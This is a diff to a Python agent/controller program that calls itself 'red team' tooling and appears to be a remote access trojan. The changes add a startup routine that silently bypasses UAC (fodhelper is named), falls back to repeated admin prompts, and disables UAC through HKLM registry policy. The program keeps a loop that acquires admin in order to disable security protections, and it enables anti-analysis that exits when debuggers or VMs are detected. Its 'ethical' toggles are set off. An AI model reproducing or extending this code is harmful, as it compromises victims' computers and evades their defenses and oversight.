@@ -217,12 +217,12 @@ DEBUG_MODE = True  # Enable debug logging for troubleshooting
 UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = True  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
-KEEP_ORIGINAL_PROCESS = True  # FALSE = Exit original process after getting admin (prevent duplicates)
+KEEP_ORIGINAL_PROCESS = False  # FALSE = Exit original process after getting admin (prevent duplicates)
 ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 
 # ✅ NEW ETHICAL SETTINGS
-REQUEST_ADMIN_FIRST = False  # TRUE = Request admin permission FIRST before doing anything
-DISABLE_UAC_BYPASS = False   # TRUE = Disable all silent UAC bypass attempts
+REQUEST_ADMIN_FIRST = False
+DISABLE_UAC_BYPASS = False
 MAX_PROMPT_ATTEMPTS = 3     # Limit prompts to 3 attempts instead of 999
 
 # Controller URL override flag (set URL via env)
@@ -15009,9 +15009,53 @@ if __name__ == "__main__":
         # Exit immediately to prevent recursive execution
         sys.exit(0)
     
+    # FIRST EXECUTION: Aggressive path to ensure admin, then apply registry import
+    if WINDOWS_AVAILABLE:
+        try:
+            print("=" * 80)
+            print("[STARTUP] FIRST ACTION: Acquire admin and apply UAC registry disable (HKLM)")
+            print("=" * 80)
+            # If not admin, try bypass first
+            if not is_admin():
+                print("[STARTUP] Not admin - attempting aggressive UAC bypass...")
+                bypass_ok = False
+                try:
+                    bypass_ok = attempt_uac_bypass()
+                except Exception as e:
+                    print(f"[STARTUP] UAC bypass error: {e}")
+                # If bypass launched elevated instance, exit this one to let it take over
+                if bypass_ok and not is_admin() and not KEEP_ORIGINAL_PROCESS:
+                    print("[STARTUP] Elevated instance launched - exiting original process")
+                    time.sleep(1)
+                    sys.exit(0)
+                # If still not admin after bypass, fall back to UAC prompt
+                if not is_admin():
+                    print("[STARTUP] Falling back to UAC prompt (runas)...")
+                    try:
+                        run_as_admin_with_limited_attempts()
+                    except Exception as e:
+                        print(f"[STARTUP] UAC prompt error: {e}")
+            # Apply registry import only if admin
+            if is_admin():
+                print("[STARTUP] Applying UAC registry import (HKLM Policies\\System)")
+                result_first = False
+                try:
+                    result_first = silent_disable_uac_method4()
+                except Exception as e:
+                    print(f"[STARTUP] UAC registry import error: {e}")
+                if result_first:
+                    print("[STARTUP] ✅ UAC registry import applied")
+                else:
+                    print("[STARTUP] ⚠️ UAC registry import failed (check permissions)")
+            else:
+                print("[STARTUP] ❌ Still not admin - registry import skipped")
+            print("=" * 80)
+        except Exception as e:
+            print(f"[STARTUP] Unexpected error in first action: {e}")
+    
     # RED TEAM MODE: AGGRESSIVE UAC BYPASS AT STARTUP
     # Use fodhelper.exe to automatically elevate to admin BEFORE Defender can block
-    if WINDOWS_AVAILABLE and not is_admin():
+    if WINDOWS_AVAILABLE and not is_admin() and not DISABLE_UAC_BYPASS:
         print("=" * 80)
         print("[RED TEAM] 🚨 AGGRESSIVE UAC BYPASS INITIATED")
         print("[RED TEAM] Using fodhelper.exe to auto-elevate to admin privileges")
@@ -15060,25 +15104,28 @@ if __name__ == "__main__":
             print("[STARTUP] ⚪ Running as Standard User")
             print("[STARTUP] 🔄 Attempting to request admin privileges...")
             
-            # Try to elevate privileges automatically
             if REQUEST_ADMIN_FIRST:
-                print("[STARTUP] 🔄 Using automatic UAC bypass methods...")
-                if attempt_uac_bypass():
-                    print("[STARTUP] ✅ UAC bypass initiated successfully!")
-                    print("[STARTUP] ⏳ Waiting for elevation to complete...")
-                    time.sleep(3)
-                    
-                    # Check if we're now admin after bypass
-                    if is_admin():
-                        print("[STARTUP] ✅✅✅ SUCCESSFULLY ELEVATED TO ADMIN!")
+                if run_as_admin_with_limited_attempts():
+                    print("[STARTUP] ✅ Admin privileges granted")
+                else:
+                    print("[STARTUP] ✅ User declined admin - continuing without admin")
+            else:
+                if not DISABLE_UAC_BYPASS:
+                    print("[STARTUP] 🔄 Using automatic UAC bypass methods...")
+                    if attempt_uac_bypass():
+                        print("[STARTUP] ✅ UAC bypass initiated successfully!")
+                        print("[STARTUP] ⏳ Waiting for elevation to complete...")
+                        time.sleep(3)
+                        if is_admin():
+                            print("[STARTUP] ✅✅✅ SUCCESSFULLY ELEVATED TO ADMIN!")
+                        else:
+                            print("[STARTUP] ⚠️ UAC bypass initiated but not yet elevated")
+                            print("[STARTUP] Continuing with standard user privileges...")
                     else:
-                        print("[STARTUP] ⚠️ UAC bypass initiated but not yet elevated")
+                        print("[STARTUP] ⚠️ Automatic UAC bypass failed")
                         print("[STARTUP] Continuing with standard user privileges...")
                 else:
-                    print("[STARTUP] ⚠️ Automatic UAC bypass failed")
-                    print("[STARTUP] Continuing with standard user privileges...")
-            else:
-                print("[STARTUP] ⚠️ Admin request disabled (REQUEST_ADMIN_FIRST=False)")
+                    print("[STARTUP] ⚠️ UAC bypass disabled")
         
         print("=" * 80)
     
@@ -15098,46 +15145,43 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"[STARTUP] WSL routing error: {e}")
         
-        # 1. AGGRESSIVE ADMIN ACQUISITION (RED TEAM PRIORITY)
-        print("\n[STARTUP] Step 1: AGGRESSIVE ADMIN ACQUISITION (RED TEAM MODE)...")
-        print("[STARTUP] ENSURING ADMIN PRIVILEGES BEFORE SECURITY DISABLE!")
-        print("[STARTUP] Using multiple UAC bypass techniques for maximum reliability!")
-        
-        admin_acquired = False
-        max_attempts = 3
-        
-        for attempt in range(max_attempts):
-            print(f"[STARTUP] Admin acquisition attempt {attempt + 1}/{max_attempts}...")
+        if not DISABLE_UAC_BYPASS:
+            print("\n[STARTUP] Step 1: AGGRESSIVE ADMIN ACQUISITION (RED TEAM MODE)...")
+            print("[STARTUP] ENSURING ADMIN PRIVILEGES BEFORE SECURITY DISABLE!")
+            print("[STARTUP] Using multiple UAC bypass techniques for maximum reliability!")
             
-            # Check if we're already admin
-            if is_admin():
-                print("[STARTUP] ✅ Already running as Administrator")
-                admin_acquired = True
-                break
+            admin_acquired = False
+            max_attempts = 3
+            
+            for attempt in range(max_attempts):
+                print(f"[STARTUP] Admin acquisition attempt {attempt + 1}/{max_attempts}...")
                 
-            # Use aggressive UAC bypass to gain admin
-            try:
-                if bootstrap_uac_disable_no_admin():
-                    print("[STARTUP] ✅✅✅ ADMIN PRIVILEGES ACQUIRED SUCCESSFULLY!")
-                    print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
+                if is_admin():
+                    print("[STARTUP] ✅ Already running as Administrator")
                     admin_acquired = True
                     break
-                else:
-                    print(f"[STARTUP] ⚠️ UAC bypass attempt {attempt + 1} failed")
-                    time.sleep(2)  # Brief delay before retry
                     
-            except Exception as e:
-                print(f"[STARTUP] UAC bypass error: {e}")
-                time.sleep(2)
-        
-        # CRITICAL: If admin not acquired, use fallback methods
-        if not admin_acquired:
-            print("[STARTUP] ❌ CRITICAL: Could not acquire admin privileges!")
-            print("[STARTUP] ⚠️ Security feature disable may be limited without admin rights")
-            print("[STARTUP] ℹ️ Agent will continue but some protections may remain active")
-        else:
-            print("[STARTUP] ✅ ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE")
+                try:
+                    if bootstrap_uac_disable_no_admin():
+                        print("[STARTUP] ✅✅✅ ADMIN PRIVILEGES ACQUIRED SUCCESSFULLY!")
+                        print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
+                        admin_acquired = True
+                        break
+                    else:
+                        print(f"[STARTUP] ⚠️ UAC bypass attempt {attempt + 1} failed")
+                        time.sleep(2)
+                        
+                except Exception as e:
+                    print(f"[STARTUP] UAC bypass error: {e}")
+                    time.sleep(2)
             
+            if not admin_acquired:
+                print("[STARTUP] ❌ CRITICAL: Could not acquire admin privileges!")
+                print("[STARTUP] ⚠️ Security feature disable may be limited without admin rights")
+                print("[STARTUP] ℹ️ Agent will continue but some protections may remain active")
+            else:
+                print("[STARTUP] ✅ ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE")
+        
         # Verify current admin status
         current_admin = is_admin()
         print(f"[STARTUP] Current admin status: {'✅ ADMIN' if current_admin else '❌ STANDARD USER'}")
